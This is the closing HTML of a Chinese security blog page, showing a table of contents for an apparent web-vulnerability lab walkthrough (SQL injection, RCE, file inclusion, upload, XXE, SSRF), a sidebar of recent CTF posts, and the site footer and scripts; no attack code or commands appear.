get )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">搜索型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.</span> <span class="toc-text">xx型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#insert-updata%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text">insert&#x2F;updata注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%85%A5updatexml%E5%87%BD%E6%95%B0"><span class="toc-number">4.5.1.</span> <span class="toc-text">引入updatexml函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-number">4.5.1.1.</span> <span class="toc-text">函数解释：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86"><span class="toc-number">4.5.1.2.</span> <span class="toc-text">报错原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.5.1.3.</span> <span class="toc-text">约束条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-number">4.5.1.4.</span> <span class="toc-text">注入语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-number">4.5.1.5.</span> <span class="toc-text">实操</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete%E6%B3%A8%E5%85%A5"><span class="toc-number">4.6.</span> <span class="toc-text">delete注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-header%E6%B3%A8%E5%85%A5"><span class="toc-number">4.7.</span> <span class="toc-text">http header注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8User-Agent%E5%A4%84%E6%B3%A8%E5%85%A5"><span class="toc-number">4.7.1.</span> <span class="toc-text">在User-Agent处注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8Cookie%E5%A4%84%E6%B3%A8%E5%85%A5"><span class="toc-number">4.7.2.</span> <span class="toc-text">在Cookie处注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.8.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.9.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.10.</span> <span class="toc-text">宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-number">5.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exec-%E2%80%9Cping%E2%80%9D"><span class="toc-number">5.1.</span> <span class="toc-text">exec “ping”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exec-%E2%80%9Ceval%E2%80%9D"><span class="toc-number">5.2.</span> <span class="toc-text">exec “eval”</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-inclusion-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.</span> <span class="toc-text">File inclusion( 文件包含 )</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#File-inclusion-local"><span class="toc-number">6.1.</span> <span class="toc-text">File inclusion( local )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-inclusion-remote"><span class="toc-number">6.2.</span> <span class="toc-text">File inclusion( remote )</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unsafe-filedownload"><span class="toc-number">7.</span> <span class="toc-text">Unsafe filedownload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unsafe-fileupload"><span class="toc-number">8.</span> <span class="toc-text">Unsafe fileupload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#client-check"><span class="toc-number">8.1.</span> <span class="toc-text">client check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mime-type"><span class="toc-number">8.2.</span> <span class="toc-text">Mime type</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getimagesize"><span class="toc-number">8.3.</span> <span class="toc-text">getimagesize</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Over-Permission"><span class="toc-number">9.</span> <span class="toc-text">Over Permission</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-number">9.1.</span> <span class="toc-text">水平越权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-number">9.2.</span> <span class="toc-text">垂直越权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">10.</span> <span class="toc-text">..&#x2F;..&#x2F;( 目录遍历 )</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">11.</span> <span class="toc-text">敏感信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#icanseeyourABC"><span class="toc-number">11.1.</span> <span class="toc-text">icanseeyourABC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">12.</span> <span class="toc-text">PHP反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">13.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#URL%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">14.</span> <span class="toc-text">URL重定向</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">15.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-curl"><span class="toc-number">15.1.</span> <span class="toc-text">SSRF( curl )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-file-get-content"><span class="toc-number">15.2.</span> <span class="toc-text">SSRF( file_get_content )</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/09/28/%E5%B8%B8%E8%A7%81%E5%9B%BE%E5%BD%A2%E7%BC%96%E7%A0%81/" title="无题"><img src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1628069562539-3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2021/09/28/%E5%B8%B8%E8%A7%81%E5%9B%BE%E5%BD%A2%E7%BC%96%E7%A0%81/" title="无题">无题</a><time datetime="2021-09-28T10:51:27.058Z" title="发表于 2021-09-28 18:51:27">2021-09-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/11/rarctf/" title="rarctf"><img src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1629196496400-1629196496398.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="rarctf"/></a><div class="content"><a class="title" href="/2021/08/11/rarctf/" title="rarctf">rarctf</a><time datetime="2021-08-11T06:05:28.116Z" title="发表于 2021-08-11 14:05:28">2021-08-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/10/BSides%20Noida%20CTF%202021/" title="BSides Noida CTF 2021"><img src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1629196280857-1629196280849.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BSides Noida CTF 2021"/></a><div class="content"><a class="title" href="/2021/08/10/BSides%20Noida%20CTF%202021/" title="BSides Noida CTF 2021">BSides Noida CTF 2021</a><time datetime="2021-08-10T10:10:59.758Z" title="发表于 2021-08-10 18:10:59">2021-08-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/07/escapeshellarg/" title="escapeshellarg逃逸与参数注入"><img src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1628069561595-3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="escapeshellarg逃逸与参数注入"/></a><div class="content"><a class="title" href="/2021/08/07/escapeshellarg/" title="escapeshellarg逃逸与参数注入">escapeshellarg逃逸与参数注入</a><time datetime="2021-08-07T06:05:45.549Z" title="发表于 2021-08-07 14:05:45">2021-08-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/05/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="流量分析"><img src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1627968867847-5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="流量分析"/></a><div class="content"><a class="title" href="/2021/08/05/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="流量分析">流量分析</a><time datetime="2021-08-05T07:28:36.483Z" title="发表于 2021-08-05 15:28:36">2021-08-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By T0mrvvi1b3t</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><span>豫ICP备2021008961号-1</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>